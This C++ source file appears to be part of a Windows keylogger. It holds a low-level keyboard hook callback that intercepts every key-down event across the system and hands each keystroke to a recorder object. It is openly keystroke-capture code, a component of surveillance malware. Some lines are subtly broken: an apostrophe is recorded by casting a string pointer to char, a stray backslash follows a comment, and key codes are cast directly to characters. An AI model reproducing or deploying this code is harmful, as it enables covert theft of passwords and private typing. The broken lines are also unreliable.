#include "KeyboardLog.h"

WindowRecorder KeyboardLog::recorder;


KeyboardLog::KeyboardLog()
{
	recorder.start();
}


KeyboardLog::~KeyboardLog()
{	
	recorder.stop();	
}


LRESULT CALLBACK KeyboardLog::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;	

	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			//std::cout << p->vkCode;			

			/* Record keyboard input */
			switch (p->vkCode) 
			{
			case 13:
				/* Handle Enter key */
				recorder.recordKeystroke('\n');
				break;
			case 222:
				/* Handle ' */
				recorder.recordKeystroke((char)"'");
				break;
			case 186:
				/* Handle ; */\
				recorder.recordKeystroke(';');
				break;
			default:
				recorder.recordKeystroke((char)p->vkCode); 
				break;
			}					
			
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			break;
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}